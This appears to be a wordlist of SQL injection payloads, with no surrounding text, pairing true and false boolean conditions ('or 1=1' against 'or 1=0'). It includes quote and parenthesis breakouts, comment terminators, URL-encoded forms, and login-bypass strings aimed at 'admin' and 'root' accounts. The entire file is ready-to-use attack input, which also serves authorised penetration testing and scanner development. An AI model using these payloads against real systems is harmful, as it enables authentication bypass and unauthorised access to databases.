' or 1=1	' or 1=0
' or 1=1--	' or 1=0--
' or 1=1#	' or 1=0#
' or 1=1/*	' or 1=0/*
" or 1=1	" or 1=0
" or 1=1--	" or 1=0--
" or 1=1#	" or 1=0#
" or 1=1/*	" or 1=0/*
 AND 1=1#	 AND 1=0#
1 or 1=1	1 or 1=0
1 or 1=1--	1 or 1=0--
1 or 1=1#	1 or 1=0#
1 or 1=1/*	1 or 1=0/*
1 and 1=1#	1 and 1=0#
'+OR+1%3D1%23	'+OR+1%3D0%23
'+OR+1%3D1%23--	'+OR+1%3D0%23--
'+OR+1%3D1%23#	'+OR+1%3D0%23#
'+OR+1%3D1%23/*	'+OR+1%3D0%23/*
'+AND+1%3D1%23	'+AND+1%3D0%23
1+OR+1%3D1%23	1+OR+1%3D0%23
1+OR+1%3D1%23--	1+OR+1%3D0%23--
1+OR+1%3D1%23#	1+OR+1%3D0%23#
1+OR+1%3D1%23/*	1+OR+1%3D0%23/*
1+AND+1%3D1%23	1+AND+1%3D0%23
admin' AND 1=1#	admin' AND 1=0#
root' AND 1=1#	root' AND 1=0#
admin' or '1'='1	admin' or '1'='0
admin' or '1'='1'--	admin' or '1'='0'--
admin' or '1'='1'#	admin' or '1'='0'#
admin' or '1'='1'/*	admin' or '1'='0'/*
admin" or "1"="1	admin" or "1"="0
admin" or "1"="1"--	admin" or "1"="0"--
admin" or "1"="1"#	admin" or "1"="0"#
admin" or "1"="1"/*	admin" or "1"="0"/*
admin"or 1=1 or ""="	admin"or 1=0 or ""="
admin" or 1=1	admin" or 1=0
admin" or 1=1--	admin" or 1=0--
admin" or 1=1#	admin" or 1=0#
admin" or 1=1/*	admin" or 1=0/*
admin") or ("1"="1	admin") or ("1"="0
admin") or ("1"="1"--	admin") or ("1"="0"--
admin") or ("1"="1"#	admin") or ("1"="0"#
admin") or ("1"="1"/*	admin") or ("1"="0"/*
admin") or "1"="1	admin") or "1"="0
admin") or "1"="1"--	admin") or "1"="0"--
admin") or "1"="1"#	admin") or "1"="0"#
admin") or "1"="1"/*	admin") or "1"="0"/*
root" or "1"="1	root" or "1"="0
root" or "1"="1"--	root" or "1"="0"--
root" or "1"="1"#	root" or "1"="0"#
root" or "1"="1"/*	root" or "1"="0"/*
root" or 1=1 or ""="	root" or 1=0 or ""="
root" or 1=1	root" or 1=0
root" or 1=1--	root" or 1=0--
root" or 1=1#	root" or 1=0#
root" or 1=1/*	root" or 1=0/*
root") or ("1"="1	root") or ("1"="0
root") or ("1"="1"--	root") or ("1"="0"--
root") or ("1"="1"#	root") or ("1"="0"#
root") or ("1"="1"/*	root") or ("1"="0"/*
root") or "1"="1	root") or "1"="0
root") or "1"="1"--	root") or "1"="0"--
root") or "1"="1"#	root") or "1"="0"#
root") or "1"="1"/*	root") or "1"="0"/*
